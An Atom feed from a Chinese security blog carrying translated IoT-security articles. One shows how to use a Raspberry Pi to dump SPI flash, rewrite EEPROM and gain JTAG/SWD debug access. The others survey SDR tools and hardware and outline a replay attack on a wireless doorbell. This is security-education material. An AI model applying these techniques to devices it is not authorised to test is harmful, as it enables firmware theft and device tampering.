<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  
  <title><![CDATA[Lyon's blog]]></title>
  <subtitle><![CDATA[I hear and I forget.I see and I remember.I do and I understand.]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://www.youngroe.com//"/>
  <updated>2021-11-04T13:15:37.908Z</updated>
  <id>http://www.youngroe.com//</id>
  
  <author>
    <name><![CDATA[Lyon]]></name>
    <email><![CDATA[geemion@gmail.com]]></email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[树莓派-穷人的硬件黑客工具（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/10/20/IOT/using-rasberrypi-as-poor-mans-hardware-hacking-tool/"/>
    <id>http://www.youngroe.com/2021/10/20/IOT/using-rasberrypi-as-poor-mans-hardware-hacking-tool/</id>
    <published>2021-10-20T11:39:22.000Z</published>
    <updated>2021-11-04T13:15:37.908Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_介绍">0x00 介绍</h2><p>本文将介绍如何使用Raspberry Pi完成SPI、I2C、JTAG/SWD和JTAGenum通信，这里我将使用Raspberry Pi Zero，因为它足够便宜和小。</p>
<h2 id="0x01_设置树莓派">0x01 设置树莓派</h2><p>在本节开始之前，我建议你先开启你的树莓派并从树莓派配置选项中启用SPI、I2C、GPIO功能，你可一参考这个<a href="https://learn.sparkfun.com/tutorials/getting-started-with-the-raspberry-pi-zero-wireless/all" target="_blank" rel="external">链接</a>完成设置。</p>
<a id="more"></a>
<p>在下面Pin#针脚图中的编号是硬件位置编号而非GPIO接口编号。</p>
<div align="center"><br><img src="/img/20211103gpio.png" align><br></div><br>在树莓派中克隆这个项目代码：<a href="https://github.com/arunmagesh/raspi-sec-tool" target="_blank" rel="external">https://github.com/arunmagesh/raspi-sec-tool</a><br><br>## 0x01 SPI 串行外设接口<br>树莓派自带SPI接口，硬件测试中最常见的测试是利用SPI通信接口提取目标设备Flash闪存数据。常用的软件工具是flashrom，支持多种flash。我们将使用树莓派的bcm2385处理器/dev/spidev0.0 实现SPI Flash读取和写入。<br><br><strong>安装：</strong><br><br><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install build-essential pciutils usbutils libpci-<span class="built_in">dev</span> libusb-<span class="built_in">dev</span> libftdi1 libftdi-<span class="built_in">dev</span> zlib1g-<span class="built_in">dev</span> subversion libusb-<span class="number">1.0</span>-<span class="number">0</span>-<span class="built_in">dev</span></span><br><span class="line">svn co svn:<span class="comment">//flashrom.org/flashrom/trunk flashrom</span></span><br><span class="line">cd flashrom</span><br><span class="line">make</span><br></pre></td></tr></table></figure><br><br><strong>连接：</strong><br><br>CS – 24<br>MISO – 21<br>MOSI – 19<br>CLK – 23<br>3.3v – 17<br><br><div align="center"><br><img src="/img/20211103SPI_Connect.jpg" al ign><br></div>

<p>从flash中读取数据：<br><code>flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=512 -r spi_dump.bin</code></p>
<div align="center"><br><img src="/img/20211103SPI_read.jpg" align><br></div><br>不要忘记设置spispeed=512。<br>现在你可以使用binwalk或者fmk分析提取到的固件。<br><br>## 0x02 I2C 集成电路总线连接<br><br>I2C通信类似于SPI，但它只使用两条线进行通信——SDA/SCL。每个设备都通过使用其内部 i2c 地址进行访问。这里我们以 I2C EEPROM 为例，看看我们如何读写内存。i2ctools 是 Linux 软件包的一部分，因此无需安装任何东西。<br><br><strong>连接：</strong><br>SDA – 3<br>SCL – 5<br>VCC – 1<br>VSS – A0 – A1 – A2 – A3 – WP – 6<br><br><div align="center"><br><img src="/img/20211103I2C_Connect.jpg" align><br></div>

<p>获取设备的I2C地址<br><code>i2cdetect -y 1</code></p>
<div align="center"><br><img src="/img/20211103I2C_addr.jpg" align><br></div><br>本例中地址为0x50，-y 1表明你使用了哪些i2c的引脚，本例中使用 i2c-1。<br>现在使用eeprog工具读取和写入EEPROM。<br>wget <a href="http://darkswarm.org/eeprog-0.7.6-tear5.tar.gz" target="_blank" rel="external">http://darkswarm.org/eeprog-0.7.6-tear5.tar.gz</a><br>tar -xvf eeprog-0.7.6-tear5.tar.gz eeprog-0.7.6-tear12/<br>cd eeprog-0.7.6-tear12/<br>make<br>sudo make install<br><br><strong>写入数据：</strong><br><code>echo &quot;hello&quot; | ./eeprog -f -16 -w 0 -t 5 /dev/i2c-1 0x50</code><br>-w 数据偏移选项<br>-t 写入延迟<br><div align="center"><br><img src="/img/20211103I2C_write.jpg" align><br></div>

<p><strong>读取数据：</strong><br><code>./eeprog  -x /dev/i2c-1 0x50 -16  -r 0x00:0x10</code></p>
<div align="center"><br><img src="/img/20211103I2C_read.jpg" align><br></div>

<h2 id="0x03_调试器-JTAG/SWD">0x03 调试器-JTAG/SWD</h2><p>JTAG/SWD 是允许开发人员调试微控制器或微处理器的标准接口。从攻击者的角度来看，拥有调试权限意味着完全控制了设备，攻击者可以转储设备内部数据或动态更改内存。让我们看看仅使用 Raspberry pi 访问 JTAG 和 SWD接口。我们使用开源工具 openOCD与调试器进行交互。<br><strong>连接：</strong><br>JTAG:</p>
<p>TCK – 23<br>TMS – 22<br>TDI – 19<br>TDO – 21<br>SRST – 12<br>GND – 20</p>
<p>SWD:</p>
<p>SWDIO – 18<br>SWCLK – 22<br>SRST – 12<br>GND – 14</p>
<h3 id="安装openOCD">安装openOCD</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone gi<span class="variable">t:</span>//git.code.<span class="keyword">sf</span>.net/<span class="keyword">p</span>/openocd/code openocd</span><br><span class="line"><span class="keyword">cd</span> openocd/</span><br><span class="line">./bootstrap</span><br><span class="line">./configure –enable-maintainer-<span class="built_in">mode</span> –enable-bcm2835gpio –enable-sysfsgpio</span><br><span class="line"><span class="keyword">make</span> &amp; sudo <span class="keyword">make</span> install</span><br></pre></td></tr></table></figure>
<p>耐心等待一会就回安装完成。</p>
<h3 id="JTAG">JTAG</h3><p>JTAG 的配置文件随 openOCD 包一起提供。只需带上目标 cfg文件运行它就会连接到JTAG。<br><code>openocd -f interface/raspberrypi-native.cfg -f target/stm32f4x.cfg</code></p>
<div align="center"><br><img src="/img/20211103JTAG.jpg" align><br></div><br>现在你可以使用gdb连接并调试设备。<br><br>### SWD<br><br><code>openocd -f raspberrypi_swd.cfg -f target/stm32f4x.cfg</code><br>raspberrypi_swd.cfg 位于你之前下载的 git 文件夹中。<br><div align="center"><br><img src="/img/20211103SWD.jpg" align><br></div><br>现在你可以使用gdb连接并调试设备。<br><br>### JTAGenum<br><br>在大部分设备中，很少能找到 JTAG 接口和引脚所在的位置。因此我们使用JTAGenum 工具扫描设备的所有引脚并告诉你哪些引脚是 TMS-TCK-TDI-TDO。如果你没有目标设备的开发文档，这将非常有用。<br>安装：<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/cyphunk/JTAGenum</span><br><span class="line"><span class="keyword">cd</span> JTAGenum</span><br><span class="line"><span class="keyword">source</span> JTAGenum.<span class="keyword">sh</span></span><br><span class="line">scan</span><br></pre></td></tr></table></figure><br><br>需要使用3 – 5 – 7 – 11 – 13 – 15及ground引脚。<br>这将需要一些时间，因为 GPIO 非常慢。<br><div align="center"><br><img src="/img/20211103JTAG_SCAN_Done.jpg" align><br></div><br>成功找到。<br><div align="center"><br><img src="/img/20211103JTAG_SCAN_Done2.jpg" align><br></div><br>我花的时间。<br><div align="center"><br><img src="/img/20211103JTAG_SCAN_time.jpg" align><br></div>

<p>伙计们，这就是全部。如果我发现更多关于使用 Raspberry Pi 作为其他很酷的东西的信息，我会更新。<br>我们设计了一个板子，可以在没有杂乱电线的情况下执行这些操作。如果你碰巧遇到 <a href="https://twitter.com/aseemjakhar?lang=en" target="_blank" rel="external">Aseem Jakhar</a>，你可以得到一个。</p>
<div align="center"><br><img src="/img/20211103payatu.jpg" align><br></div>

<blockquote>
<p>译注：国内也有人设计了板子，淘宝有卖 <a href="https://www.muselab-tech.com/geekgong-ju-ba-shu-mei-pai-bian-cheng-duo-gong-neng-diao-shi-shao-lu-qi/" target="_blank" rel="external">https://www.muselab-tech.com/geekgong-ju-ba-shu-mei-pai-bian-cheng-duo-gong-neng-diao-shi-shao-lu-qi/</a></p>
</blockquote>
<h2 id="0x04_参考">0x04 参考</h2><ul>
<li><a href="https://github.com/cyphunk/JTAGenum" target="_blank" rel="external">https://github.com/cyphunk/JTAGenum</a></li>
<li><a href="https://github.com/synthetos/PiOCD/wiki/Using-a-Raspberry-Pi-as-a-JTAG-Dongle" target="_blank" rel="external">https://github.com/synthetos/PiOCD/wiki/Using-a-Raspberry-Pi-as-a-JTAG-Dongle</a></li>
<li><a href="http://catch22.eu/baremetal/openocd_sysfs_stm32/" target="_blank" rel="external">http://catch22.eu/baremetal/openocd_sysfs_stm32/</a></li>
<li><a href="https://movr0.com/2016/09/02/use-raspberry-pi-23-as-a-jtagswd-adapter/" target="_blank" rel="external">https://movr0.com/2016/09/02/use-raspberry-pi-23-as-a-jtagswd-adapter/</a></li>
<li><a href="https://www.richud.com/wiki/Rasberry_Pi_I2C_EEPROM_Program" target="_blank" rel="external">https://www.richud.com/wiki/Rasberry_Pi_I2C_EEPROM_Program</a></li>
<li><a href="https://libreboot.org/docs/install/rpi_setup.html" target="_blank" rel="external">https://libreboot.org/docs/install/rpi_setup.html</a></li>
</ul>
<p><em>原文链接：<a href="https://payatu.com/using-rasberrypi-as-poor-mans-hardware-hacking-tool" target="_blank" rel="external">https://payatu.com/using-rasberrypi-as-poor-mans-hardware-hacking-tool</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_介绍">0x00 介绍</h2><p>本文将介绍如何使用Raspberry Pi完成SPI、I2C、JTAG/SWD和JTAGenum通信，这里我将使用Raspberry Pi Zero，因为它足够便宜和小。</p>
<h2 id="0x01_设置树莓派">0x01 设置树莓派</h2><p>在本节开始之前，我建议你先开启你的树莓派并从树莓派配置选项中启用SPI、I2C、GPIO功能，你可一参考这个<a href="https://learn.sparkfun.com/tutorials/getting-started-with-the-raspberry-pi-zero-wireless/all">链接</a>完成设置。</p>]]>
    
    </summary>
    
      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[物联网安全101-9.软件无线电简介（Software Defined Radio，SDR）:软件部分（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/09/23/IOT/iot-security-part-9-introduction-to-software-defined-radio/"/>
    <id>http://www.youngroe.com/2021/09/23/IOT/iot-security-part-9-introduction-to-software-defined-radio/</id>
    <published>2021-09-23T14:50:22.000Z</published>
    <updated>2021-11-14T05:48:26.730Z</updated>
    <content type="html"><![CDATA[<div align="center"><br><img src="/img/sdr.png" align><br></div>

<h2 id="介绍">介绍</h2><p>本文是“物联网安全”系列的一部分。如果您还没有阅读本系列之前的博客（第 1 - 7 部分），我建议您先阅读它们，除非您已经熟悉这些概念并且只想阅读当前主题。<br><a href="/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/">物联网安全 - 第 1 部分（101 - 物联网介绍和架构）</a><br><a href="/2021/09/23/IOT/iot-security-part-8-introduction-to-software-defined-radio-sdr/">物联网安全 - 第 8 部分（软件定义无线电简介）</a>本系列的前一篇博客。<br>这篇博客将是上一篇博客的延续。在此，我们将研究一些可用的软件 SDR 工具。我们还将定义一种关于如何处理 RF 目标的方法。</p>
<a id="more"></a>
<h2 id="软件">软件</h2><p>凭借强大的开源社区，SDR 拥有各种软件工具，可提供所有信号处理功能。让我们来看看一些广泛使用的 SDR 软件以及它们的不同之处。这里主要介绍的工具大部分适用于Linux平台。</p>
<h3 id="侦察工具：">侦察工具：</h3><ul>
<li><p>GQRX<br>GQRX 是一种频谱分析仪，用于浏览频段和寻找目标的工作频率。它带有常见的解调器，如 AM、CW、FM。由于具有解调功能，可以记录解调的信号流，在下一阶段的评估中可以在 Audacity 和 Inspectrum 等工具中进一步分析。GQRX 与大部分的 SDR 硬件兼容。GQRX 的其他替代品具有或多或少相同的功能，如下所述：</p>
</li>
<li><p><a href="http://www.hdsdr.de/" target="_blank" rel="external">HDSDR</a> / <a href="https://airspy.com/download/" target="_blank" rel="external">SDR# (SDR-Sharp)</a> [适用于 Windows]</p>
</li>
<li><p><a href="https://github.com/xmikos/qspectrumanalyzer" target="_blank" rel="external">Qspectrum 分析仪</a>（带自动峰值检测）</p>
</li>
<li><p><a href="https://osmocom.org/projects/gr-osmosdr/wiki" target="_blank" rel="external">Osmocom-FFT</a>（包含在 Osmocom GNU Radio 模块中的频谱分析仪）</p>
</li>
</ul>
<h3 id="基本评估：">基本评估：</h3><ul>
<li>Universal Radio Hacker(URH)：<br>URH 是一个完整的无线协议调查套件，原生支持主要 SDR 硬件。几乎一切都在这里自动化，从频谱分析到甚至发送操纵信号。人们可以毫不费力地识别调制类型并自动解码信号。对于手动检查，还提供接收比特流的差分视图，这对于解释信号数据非常有用。其他主要功能包括协议分析器（自动和手动）。这就是它变得有趣的地方，它有一个用于有状态攻击的模拟环境和一个针对无状态协议的模糊测试元素！</li>
</ul>
<div align="center"><br><img src="/img/urh.png" align><br></div>

<p>来源：<a href="https://github.com/jopohl/urh" target="_blank" rel="external">https://github.com/jopohl/urh</a></p>
<p>URH 的另一个替代方案是 <a href="https://github.com/miek/inspectrum" target="_blank" rel="external">Inspectrum</a>。</p>
<ul>
<li>Audacity：<br>Audacity 是一种多声道音频编辑工具，但与 GQRX 结合使用时，它会变成无线电信号分析仪。Audacity 是开源的，可用于所有常见的操作系统。它只接受记录的信号，但信号必须被解调，就像来自 GQRX 的记录信号一样。</li>
</ul>
<h3 id="高级评估：">高级评估：</h3><ul>
<li><p>GNU Radio<br>GNU Radio 是一个开源工具包，用于实现 SDR。它提供了执行不同信号处理步骤的基本模块，例如滤波器、解码器、解调器等等。它适用于所有主要的 SDR 硬件。主要的好处是框架的巨大可扩展性。可以用 C++ 或 Python 编写块。</p>
</li>
<li><p>GNURadio Companion (GRC)<br>GNU Radio Companion (GRC) 是一个前端可视化工具，它是 Gnu radio 框架的一部分。我们应该记住，GRC 的创建是为了简化 GNU Radio 的使用，允许我们以图形方式创建 python 文件，而不是单独在代码中创建它们。它允许人们简单地拖动、修改参数并开始处理信号。随着我们的进行，我们将更加关注它。</p>
</li>
</ul>
<div align="center"><br><img src="/img/GRC.png" align><br></div>

<h3 id="其他：">其他：</h3><ul>
<li><p>Android<br>随着移动设备的处理能力随着时间的推移显着增加，Android SDR 正在进入移动设备。虽然仍然非常有限，但只需加载设备的一些库，通过 OTG 电缆将您的 SDR 硬件连接到您的 android 即可完成这项工作。RTL-SDR 加密狗、Lime SDR mini 和 HackRF 等设备以及其他一些设备与 android 设备配合良好。</p>
</li>
<li><p>SDR touch：<br>类似于 GQRX，用作移动设备的频谱分析仪。</p>
</li>
<li><p>GNU Radio Android：<br>最近 GNU Radio for android 出现了。这是您移动设备中的所有 SDR 解决方案。尽管截至目前，它支持的移动设备有限，但随着时间的推移，预计主要设备将覆盖。</p>
</li>
<li><p>Scapy-radio：<br>Scapy-radio 是 Scapy 的扩展，Scapy 是一种用 Python 编写的开源网络数据包操作工具。此扩展使用 Scapy 作为无线电数据包操作的后端。作为从 Scapy 到 SDR 设备的网关，使用了 GNU Radio。</p>
</li>
</ul>
<h2 id="如何接近目标：">如何接近目标：</h2><p>我们将分解您如何接近 RF 目标、捕获它、对其进行逆向工程并发起攻击！</p>
<ul>
<li>SDR 硬件：HackRF One</li>
<li>SDR 软件：GQRX、GNURadio Companion</li>
<li>Target：为此，我们选择了一个本地制造的 6 美元无线门铃，结果证明它是模拟的。让我们看看我们是怎么做的……</li>
</ul>
<div align="center"><br><img src="/img/sdr_target.png" align><br></div>

<p>IMG标签图片来源：<a href="https://xkcd.com/1457/" target="_blank" rel="external">https://xkcd.com/1457/</a></p>
<h3 id="1)_侦察">1) 侦察</h3><p>如果您拥有该设备，则大部分任务已完成，因为您可以从此处简单地查找该设备的 FCC ID ，这将为您提供有关该设备的许多详细信息，即工作频率、设备内部结构等等等，这将减轻很多评估。<br>在我们的例子中，由于它是本地制造的设备，它没有任何 FCC ID :(</p>
<h3 id="2)_获取信号">2) 获取信号</h3><p>您需要分析频谱以找出正在传输的信号的位置。您可以使用任何您熟悉的频谱分析仪。以下是可帮助您找到目标频率的常用工作频率列表：</p>
<ul>
<li>300MHz</li>
<li>433Mhz</li>
<li>868Mhz</li>
<li>915Mhz<br>所有这些都是常用的 ISM 和免许可证频段。WPC（印度政府电信部 (DOT) 和美国联邦通信委员会 (FCC) 的无线规划和协调部门）等机构允许此类频段免许可，前提是这些频段仅用于低功率无线设备具有为带宽、输出功率和最大有效辐射功率定义的细节。</li>
</ul>
<div align="center"><br><img src="/img/gqrx_fren.png" align><br></div>

<p>在我们的例子中，我们在这一步中使用了 GQRX。我们观察到 302MHz 的峰值，这对于任何操作设备来说都有些不寻常。</p>
<h3 id="3)_记录">3) 记录</h3><p>捕获信号是保存信号以供分析的好方法。人们可以轻松地对记录的信号运行信号处理操作，而无需任何 RF 目标产生实时信号。在我们的例子中，我们使用下面的 GRC 流程图。我们将信号保存在 .cfile 中。</p>
<div align="center"><br><img src="/img/79f57116cbf.png" align><br></div>

<p>记录模拟门铃信号（流程图）</p>
<h3 id="4)_解调">4) 解调</h3><p>最好的方法就是简单地查看信号。如果您精通调制技术，则可以轻松理解所使用的调制类型，即 FSK 中的压缩和解压缩。下面是一些常用的调制：</p>
<ul>
<li>FSK（频移键控）</li>
<li>ASK（幅移键控）</li>
<li>OOK（开关键控）</li>
<li>PSK（相移键控）</li>
</ul>
<h3 id="5)_流程">5) 流程</h3><p>一旦我们确定了调制和工作频率，我们就可以开始使用 GRC 块处理信号并创建流程图。这通常包括解调实时/捕获的信号、放大信号、将其移植到 Wireshark 等。随着我们继续介绍处理特定信号所需的 GRC 块的使用等内容，我们将更详细地讨论 GRC。</p>
<h3 id="6)_解码">6) 解码</h3><p>所以一旦你掌握了比特/比特流，你就可以开始解码它。常用的编码技术有</p>
<ul>
<li>NRZ</li>
<li>NRZI</li>
<li>Bipolar AMI</li>
<li>Manchester</li>
</ul>
<p>仅举几例。您会发现它们已经存在并且可以在 Universal Radio Hacker (URH) 中使用。</p>
<h3 id="7）攻击">7）攻击</h3><p>完成逆向信号后，即弄清楚调制、编码、数据字节和其他细节等内容。您现在可以发起攻击了！最常见的一种是重放攻击，其中发送回捕获的信号。</p>
<p>第 3 步和第 5 步不适用于我们的目标（因为它是模拟的）但是我们对目标进行了攻击，我们将使用 GRC 进行重放攻击。下面是相应的 GRC 流程图。我们重放了捕获的信号 .cfile。</p>
<div align="center"><br><img src="/img/2a031803073.png" align><br></div>

<p>重放模拟门铃信号（流程图）</p>
<h2 id="结论：">结论：</h2><p>我们希望您清楚地了解可用的主要 SDR 软件工具有哪些，以及为什么一个比另一个更好。此外，了解如何接近 RF 目标会让您了解使用 SDR 进行 RF 目标评估所涉及的步骤。</p>
<p>继续下一部分 - <a href="https://payatu.com/blog/aseem/iot-security---part-10-introduction-to-mqtt-protocol-and-security" target="_blank" rel="external">IoT 安全性 - 第 10 部分（MQTT 协议和安全性介绍）</a></p>
<h2 id="资源：">资源：</h2><p><a href="https://github.com/bastibl/gnuradio-android" target="_blank" rel="external">GNURadio-Android</a></p>
<p><em>原文链接：<a href="https://payatu.com/blog/appar/iot-security-%E2%80%93-part-9-introduction-to-software-defined-radio" target="_blank" rel="external">https://payatu.com/blog/appar/iot-security-%E2%80%93-part-9-introduction-to-software-defined-radio</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<div align="center"><br><img src="/img/sdr.png" align=""/><br></div>

<h2 id="介绍">介绍</h2><p>本文是“物联网安全”系列的一部分。如果您还没有阅读本系列之前的博客（第 1 - 7 部分），我建议您先阅读它们，除非您已经熟悉这些概念并且只想阅读当前主题。<br><a href="/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/">物联网安全 - 第 1 部分（101 - 物联网介绍和架构）</a><br><a href="/2021/09/23/IOT/iot-security-part-8-introduction-to-software-defined-radio-sdr/">物联网安全 - 第 8 部分（软件定义无线电简介）</a>本系列的前一篇博客。<br>这篇博客将是上一篇博客的延续。在此，我们将研究一些可用的软件 SDR 工具。我们还将定义一种关于如何处理 RF 目标的方法。</p>]]>
    
    </summary>
    
      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[物联网安全101-8.软件无线电（Software Defined Radio，SDR）简介（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/09/23/IOT/iot-security-part-8-introduction-to-software-defined-radio-sdr/"/>
    <id>http://www.youngroe.com/2021/09/23/IOT/iot-security-part-8-introduction-to-software-defined-radio-sdr/</id>
    <published>2021-09-23T13:50:22.000Z</published>
    <updated>2021-11-14T05:38:22.652Z</updated>
    <content type="html"><![CDATA[<div align="center"><br><img src="/img/sdr.png" align><br></div>

<h2 id="介绍">介绍</h2><p>本文是“物联网安全”系列的一部分。如果您还没有阅读本系列之前的博客（第 1 - 7 部分），我建议您先阅读它们，除非您已经熟悉这些概念并且只想阅读当前主题。<br><a href="/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/">物联网安全 - 第 1 部分（101 - 物联网介绍和架构）</a><br><a href="/2021/09/23/IOT/iot-security-part-7-reverse-engineering-an-iot-firmware/">物联网安全 - 第 7 部分（对 IoT 固件进行逆向工程）</a>本系列的前一篇博客。</p>
<a id="more"></a>
<p>通俗地说，软件无线电SDR是指信号处理主要在软件组件实现，即调制器/解调器、编码器/解码器、放大器、混频器（通常以硬件实现）。这些软件平台非常通用，支持所有类型的频率以及对它们的不同分析。尽管硬件仍然是非常重要（收发器和天线），但软件无线电SDR的引入无疑在物联网以及其他使用无线通信的领域掀起了一股浪潮，并使信号处理比过去更容易获得以前。</p>
<p>无线通信是物联网环境中的主要攻击面之一。SDR 是构建这些无线产品、分析其通信、最重要的是攻击的这些产品的一种技术。SDR 不仅涵盖物联网中使用的所有主要无线通信协议，即蓝牙、Zigbee、Wifi、NFC，而且还提供了大量其他可能的攻击，可用于破坏终端设备或基础设施的安全性。下面列出了其中的一些功能：</p>
<ul>
<li>密码分析攻击</li>
<li>侧信道攻击，如Tempest</li>
<li>蜂窝或移动网络攻击</li>
<li>SAT-通信分析<br>我们将在接下来的文章中介绍更多内容。</li>
</ul>
<h2 id="前置知识">前置知识</h2><p><code>“在进行信号处理时，你无法绕过数学和基础理论。”</code></p>
<p>好吧，:P 其实您不必是数学极客也可以开始使用软件定义无线电，但了解一些基本概念和术语将有助于你更好的评估你的物联网，并有助于你长期发展：</p>
<ul>
<li>模拟和数字信号的基础</li>
<li>数字信号处理的概念</li>
<li>通讯系统</li>
<li>复数</li>
<li>信号和系统</li>
<li>调制类型</li>
<li>编码类型<br>我们认为以下主题足以帮助您开始使用 RF 通信并帮助您了解 SDR。我们在文章末尾提供了一些有用的资源，可以帮助您更好地理解这些主题。</li>
</ul>
<h2 id="专用工具">专用工具</h2><p><code>“工具不过是人手的延伸……”——HW Beecher</code><br>尽管大部分信号处理是通过软件完成的，但也需要硬件工具来传输和接收信号。下面列出了 SDR 所需的一些硬件和软件工具（我们将在后续专题分析时详细说明下面提到的一些工具）：</p>
<h3 id="硬件">硬件</h3><p>基本上，当我们选择 SDR 外围设备时，主要参考以下参数：</p>
<ul>
<li><p>工作频率范围<br>这定义了外围设备能够对其执行操作（Tx 和 Rx）的频率范围。有一个更宽的工作频率范围供您使用总是很好的。</p>
</li>
<li><p>接收带宽<br>RF 前端带宽（Rx 带宽）越大，我们的 SDR 外设就越能围绕操作中心频率收集数据。请记住，使用更宽的 RF 带宽，我们总是会收集更多的噪声。</p>
</li>
<li><p>ADC 分辨率（以位为单位）<br>通常，首选具有更高分辨率的 ADC，但请记住，使用更高的 ADC 分辨率，我们需要降低信号处理开销，以便我们可以实时处理样本。因此，选择合适的 ADC 分辨率很重要。</p>
</li>
<li><p>发射和接收能力<br>虽然大多数外围设备可以接收（Rx）但并非所有外围设备都可以发送（Tx）。因此可以肯定地说收发器（Tx-Rx 都存在）是首选，因为许多攻击也需要传输（Tx）信号。此外，根据要求，收发器可分为半双工、全双工等。</p>
</li>
<li><p>成本<br>这可能是主要因素，因为大多数这些外围设备都需要花费很多钱。我们需要根据评估类型​​仔细选择一个满足我们所有要求的方法。</p>
</li>
</ul>
<p>现在让我们介绍一些常用的 SDR 设备：</p>
<p><strong>1) Realtek SDR Dongle (RTL820T2)</strong><br>向任何 SDR 爱好者或专业人士询问他们的第一个工具是什么，它可能是一个 Realtek SDR Dongle。虽然成本如此之低，但它提供了 24-1766MHz 的范围，这是非常令人印象深刻的。一些其他变体可以达到 2.2GHz。唯一的缺点是它是一个 SDR 接收器，没有任何 TX 功能（不考虑其内部本地振荡器的泄漏）。其他流行的变体是 NooElec R820T、R820T 和 Terratec R820T。</p>
<div align="center"><br><img src="/img/Rtl-sdr.jpg" align title="RTL-SDR R820T2 Dongle"><br></div><br>图片来源：<a href="https://commons.wikimedia.org/wiki/File:Rtl-sdr.jpg" target="_blank" rel="external">https://commons.wikimedia.org/wiki/File:Rtl-sdr.jpg</a><br><br><br><strong>2) HackRF One</strong><br>由于其相对合理的成本和 10MHz 至 6GHz（实用范围）的特殊频率范围，它是爱好者广泛使用和推荐的工具。它是一个 SDR 收发器，即它同时具有发送 (Tx) 和接收 (Rx) 功能。因此，对于正在寻找大频率范围、宽带宽和传输能力的人来说，它是完美的匹配。<br><br><div align="center"><br><img src="/img/Hackrf-one-img_0005.jpg" align title="HackRF One by Great Scott Gadgets"><br></div>

<p>图片来源：<a href="https://commons.wikimedia.org/wiki/File:Hackrf-one-img_0005.jpg" target="_blank" rel="external">https://commons.wikimedia.org/wiki/File:Hackrf-one-img_0005.jpg</a></p>
<p><strong>3) BladeRF 2.0 micro</strong><br>谈到强大的 SDR 外设，您不能错过 Blade RF。尽管它的工作频率范围从 47MHz 到 6GHz，带宽为 56MHz，但它的与众不同之处在于它配备了强大的 FPGA 处理器，这意味着它可以轻松地自行在板上进行一些信号处理。使其成为理想的独立设备。原因是有很多基于 BladeRF 的有趣项目，其中包括：<br><a href="https://github.com/Nuand/bladeRF/wiki/Setting-up-Yate-and-YateBTS-with-the-bladeRF" target="_blank" rel="external">YateBTS</a><br><a href="https://github.com/Nuand/bladeRF/wiki/ATSC-Transmitter" target="_blank" rel="external">ATSC Transmitter</a><br><a href="https://github.com/fyquah95/ramear" target="_blank" rel="external">RAMEAR</a><br>仅举几例。</p>
<p><strong>4) USRP B210</strong><br>Ettus 产品因其强大的功能而被专业人士和工业界广泛使用。使其成为与其他设备相比最昂贵的外围设备。它具有非常高的采样率和广泛的调谐率。说到 B210，它工作在 70Mhz 到 6Ghz 的频率上，是全双工的，并且在上面列出的 61.44MS/s 中具有最大的采样率。</p>
<p><div align="center"><br><img src="/img/800px-Usrp.jpg" align title="USRP by Ettus"><br></div><br>图片来源：<a href="https://commons.wikimedia.org/wiki/File:Usrp.jpg" target="_blank" rel="external">https://commons.wikimedia.org/wiki/File:Usrp.jpg</a></p>
<p>以下是一些流行的 SDR 外围设备的简要比较：</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Frequency Range</th>
<th>Bandwidth</th>
<th>ADC Resolution</th>
<th>Tx capability</th>
<th>Price</th>
</tr>
</thead>
<tbody>
<tr>
<td>RTL-SDR R820T2/RTL2838U</td>
<td>0.5 – 1766 MHz</td>
<td>Matches sampling rate, but with filter roll-off</td>
<td>8</td>
<td>NO</td>
<td>USD 24</td>
</tr>
<tr>
<td>HackRF One</td>
<td>1 MHz – 6 GHz</td>
<td>20 MHz</td>
<td>8</td>
<td>YES</td>
<td>USD 299</td>
</tr>
<tr>
<td>bladeRF</td>
<td>47 MHz – 6 GHz</td>
<td>56 MHz</td>
<td>12</td>
<td>YES</td>
<td>USD 480</td>
</tr>
<tr>
<td>USRP B210</td>
<td>70 MHz – 6 GHz</td>
<td>56 MHz</td>
<td>12</td>
<td>YES</td>
<td>USD 1,100</td>
</tr>
<tr>
<td>LimeSDR</td>
<td>100 kHz – 3.8 GHz</td>
<td>61.44 MHz</td>
<td>12</td>
<td>YES</td>
<td>USD 299</td>
</tr>
<tr>
<td>YARD Stick One</td>
<td>300 MHz – 1GHz</td>
<td>-</td>
<td>8</td>
<td>YES</td>
<td>USD 100</td>
</tr>
</tbody>
</table>
<h3 id="天线">天线</h3><p>在选择天线时，请牢记以下几点：</p>
<ul>
<li><p>天线增益<br>由于天线数据表中的大部分增益都涉及各向同性天线，因此有必要查看 3dB 增益和带宽的位置，并进行一些基本的数学计算以确定天线是否适合我们的操作。</p>
</li>
<li><p>孔径<br>这里的主要目标是我们可以收集多少信号或我们可以收集多大的信号。因此，建议选择处于适当中心频率的天线，并且其正面直径足以一次容纳所有传入信号。</p>
</li>
